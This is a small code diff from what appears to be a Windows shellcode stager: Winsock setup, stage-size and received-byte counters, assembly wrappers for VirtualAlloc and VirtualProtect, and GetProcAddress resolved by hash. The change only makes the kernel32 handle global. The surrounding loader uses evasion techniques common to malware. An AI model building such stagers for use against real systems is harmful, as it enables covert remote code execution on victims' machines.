@@ -15,6 +15,7 @@ extern "C" LPVOID __fastcall asmVirtualAlloc(FARPROC funcAddress, int stageSize,
 extern "C" LPVOID __fastcall asmVirtualProtect(void* addr, int stageSize, DWORD flNewProtect, FARPROC funcAddress);
 
 WSADATA WSAData;
+HANDLE kernel32;
 
 int main(int argc, const char* argv[])
 {
@@ -36,7 +37,7 @@ int main(int argc, const char* argv[])
 	int stageSize = 0;
 	int bytesReceived = 0;
 
-	HANDLE kernel32 = GetKernel32ModuleHandle();
+	kernel32 = GetKernel32ModuleHandle();
 	printf("[+] Loaded kernel32.dll: 0x%x\n", kernel32);
 	FARPROC GetProcAddress = GetAddressOfGetProcAddress(kernel32, 0x7c0dfcaa);				//Utils: asmCalculateFunctionHash("GetProcAddress")
 	printf("[+] Found GetProcAddress function: 0x%x\n", GetProcAddress);
